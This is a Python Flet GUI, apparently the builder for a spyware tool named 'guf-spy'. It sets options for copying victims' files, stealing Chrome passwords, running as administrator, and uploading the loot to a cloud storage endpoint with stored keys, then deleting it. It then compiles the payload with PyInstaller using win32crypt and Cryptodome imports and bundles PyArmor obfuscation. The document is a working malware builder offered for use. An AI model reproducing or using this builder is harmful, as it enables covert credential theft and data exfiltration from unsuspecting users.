import flet as ft
import json
import os
import shutil


with open("config.json", "r", encoding="utf-8") as file:
    data = json.load(file)

def main(page: ft.Page):
    # لیست مسیر فایل‌ها
    file_paths = []

    # توابع مدیریت مسیرها
    def add_path(e):
        if path_textbox.value:
            file_paths.append(path_textbox.value)
            add_file_to_list(path_textbox.value)
            path_textbox.value = ""
            page.update()

    def remove_path(index):
        del file_paths[index]
        file_list.controls.pop(index)
        page.update()

    def add_file_to_list(path):
        index = len(file_paths) - 1
        file_list.controls.append(
            ft.Row(
                [
                    ft.Text(path, expand=True),
                    ft.PopupMenuButton(
                        items=[
                            ft.PopupMenuItem(text="Remove", on_click=lambda e: remove_path(index))
                        ]
                    )
                ],
                alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
            )
        )

    # توابع تنظیمات
    def modchange(e):
        if moddrop.value == "Custome":
            file_list.disabled = False
            path_textbox.disabled = False
            add_button.disabled = False
        else:
            file_list.disabled = True
            path_textbox.disabled = True
            add_button.disabled = True
        data["mod"] = {
            "All file": 1,
            "Without logs": 2,
            "Custome": 3,
            "None": 4
        }.get(moddrop.value, 0)
        page.update()

    def uploadchange(e):
        if uploadcheck.value:
            data["upload"] = 1
            removecheck.disabled = False  # نمایش "Remove after Upload"
            eptextbox.disabled = False  # نمایش "Endpoint URL"
            aktextbox.disabled = False  # نمایش "Access Key"
            sktextbox.disabled = False  # نمایش "Secret Key"
        else:
            data["upload"] = 0
            removecheck.disabled = True  # مخفی کردن "Remove after Upload"
            eptextbox.disabled = True  # مخفی کردن "Endpoint URL"
            aktextbox.disabled = True  # مخفی کردن "Access Key"
            sktextbox.disabled = True 
            removecheck.value=False # مخفی کردن "Secret Key"
        page.update()

    def adminchange(e):
        if admincheck.value:
            data["admin"] = 1 
            #ab.disabled=False 
            page.update()
        else :
            data["admin"] = 0  
            #ab.disabled=True
            #ab.value=False
            page.update()
    def removechange(e):
        data["remove"] = 1 if removecheck.value else 0

    def cpasschange(e):
        data["chrome-pass"] = 1 if cpasscheck.value else 0

    def epchange(e):
        data["endpoint-url"] = eptextbox.value

    def akchange(e):
        data["access-key"] = aktextbox.value

    def skchange(e):
        data["secret-key"] = sktextbox.value

    def save(e):
        if moddrop.value == "All file":
            data["mod"] = 1
        elif moddrop.value == "Without logs":
            data["mod"] = 2
        elif moddrop.value == "Custome":
            data["mod"] = 3
        elif moddrop.value == "None":
            data["mod"] = 4
        if uploadcheck.value:
            data["upload"] = 1 # نمایش "Secret Key"
        else:
            data["upload"] = 0
        data["admin"] = 1 if admincheck.value else 0
        data["remove"] = 1 if removecheck.value else 0
        data["chrome-pass"] = 1 if cpasscheck.value else 0
        data["endpoint-url"] = eptextbox.value
        data["access-key"] = aktextbox.value
        data["secret-key"] = sktextbox.value
        data["file_paths"] = file_paths  # ذخیره لیست مسیرها
        with open("config.json", "w", encoding="utf-8") as file:
            json.dump(data, file, ensure_ascii=False, indent=4)
        
        buildbut.text="Waiting to Build"
        buildbut.disabled=True
        page.update()
        try:
            os.mkdir("build")
        except:
            pass
        shutil.copy("update.py","build")
        os.chdir("build")
        os.system(f"pyinstaller --onedir --hidden-import=sqlite3 --hidden-import=win32crypt --hidden-import=Cryptodome --hidden-import=shutil --hidden-import=pycryptodomex --hidden-import=ctypes --hidden-import=pycryptodome --hidden-import=requests --hidden-import=boto3 update.py")
        os.remove("update.py")
        os.chdir("..")
        shutil.copy("cp.py","build\\dist\\update\\_internal")
        shutil.copy("config.json","build\\dist\\update")
        os.chdir("build")
        os.chdir("dist")
        os.chdir("update")
        os.chdir("_internal")
        try:
            os.mkdir("pyarmor_runtime_000000")
        except:
            pass
        os.chdir("..")
        os.chdir("..")
        os.chdir("..")
        os.chdir("..")
        shutil.copy("pyarmor_runtime_000000\\__init__.py","build\\dist\\update\\_internal\\pyarmor_runtime_000000")
        shutil.copy("pyarmor_runtime_000000\\pyarmor_runtime.pyd","build\\dist\\update\\_internal\\pyarmor_runtime_000000")
        
        buildbut.disabled=False
        buildbut.text="Build and Save Changes"
        page.update()
        page.snack_bar = ft.SnackBar(ft.Text(f"Building guf-spy was successful"))
        page.snack_bar.open = True
        page.update()

    # صفحه نمایش "About"
    def show_about():
        content_container.content = ft.Column(
            [
                ft.Image(src="logo.png", width=500, height=400),
                ft.Text("About GUB-Config", style="headlineMedium"),
                ft.Text("Developer: Kiavash Shaterzadeh"),
                ft.Text("Email: kiavashshtzd@gmail.com"),
            ],
            spacing=10,
        )

        page.update()

    # صفحه تنظیمات
    def show_settings():
        content_container.content = ft.Column(
            [
                moddrop,
                cpasscheck,
                admincheck,

                uploadcheck,
                removecheck,
                eptextbox,
                aktextbox,
                sktextbox,
                ft.Row([path_textbox, add_button]),
                file_list,
                buildbut,
            ],
            expand=True,
        )

        page.update()

    # NavigationRail
    page.title="Guf-Config"
    page.navigation_rail = ft.NavigationRail(
        selected_index=0,
        on_change=lambda e: show_about() if e.control.selected_index == 1 else show_settings(),
        destinations=[
            ft.NavigationRailDestination(icon=ft.icons.BUILD, label="Build"),
            ft.NavigationRailDestination(icon=ft.icons.INFO, label="About"),
        ],
    )

    # Dropdown
    moddrop = ft.Dropdown(
        label="Files to Copy",
        on_change=modchange,
        options=[
            ft.dropdown.Option("All file"),
            ft.dropdown.Option("Without logs"),
            ft.dropdown.Option("Custome"),
            ft.dropdown.Option("None"),
        ],
    )
    moddrop.value = "All file"

    # تنظیمات دیگر
    uploadcheck = ft.Switch(label="Upload", value=True, on_change=uploadchange)
    removecheck = ft.Switch(label="Remove after Upload", value=True, on_change=removechange)
    cpasscheck = ft.Switch(label="Chrome passwords", value=True, on_change=cpasschange)
    admincheck = ft.Switch(label="Run as administrator", value=True, on_change=adminchange)

    eptextbox = ft.TextField(label="Endpoint URL", on_change=epchange)
    aktextbox = ft.TextField(label="Access Key", on_change=akchange)
    sktextbox = ft.TextField(label="Secret Key", on_change=skchange)
    path_textbox = ft.TextField(label="File Path",disabled=True)
    add_button = ft.FilledButton(text="Add Path", on_click=add_path,disabled=True)
    file_list = ft.ListView(expand=True, spacing=10, disabled=True)
    buildbut = ft.FilledButton(text="Build and Save Changes", on_click=save)

    content_container = ft.Container(expand=True)
    show_settings()

    # افزودن المان‌ها به صفحه
    page.add(
        ft.Row(
            [
                page.navigation_rail,
                content_container,

            ],
            expand=True,
        )
    )
if __name__=="__main__":
    ft.app(main)

